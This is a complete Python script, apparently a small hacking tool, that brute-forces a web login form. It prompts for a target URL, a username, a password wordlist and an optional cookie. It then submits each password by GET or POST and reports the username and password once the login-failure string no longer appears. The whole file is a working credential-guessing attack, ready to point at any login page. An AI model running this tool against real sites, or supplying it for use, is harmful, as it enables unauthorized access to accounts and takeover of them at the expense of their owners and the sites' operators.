import requests
from termcolor import colored

url = input("[+] Input an url:")
username = input("[*] Enter username for the account to bruteforce:")
password_file = input("[*] Enter password file to use:")
login_failed_string = input("[*] Enter string that occurs when login fails:")
cookie_value = input("[*] Enter cookie value (optional):")

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(f"Trying: {password}")
        if cookie_value != '':
            response = requests.get(url,
                                    params={'username': username,
                                            'password': password,
                                            'Login': 'Login'},
                                    cookies={'Cookie': cookie_value})
        else:
            data = {'username': username,
                    'password': password,
                    'Login': 'submit'}
            response = requests.post(url, data=data)

        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(f"[+] Found username ==> {username}", 'green'))
            print(colored(f"[+] Found password ==> {password}", 'green'))
            exit()


with open(password_file, 'r') as passwords:
    cracking(username, url)

print("[-] Password not in list.")
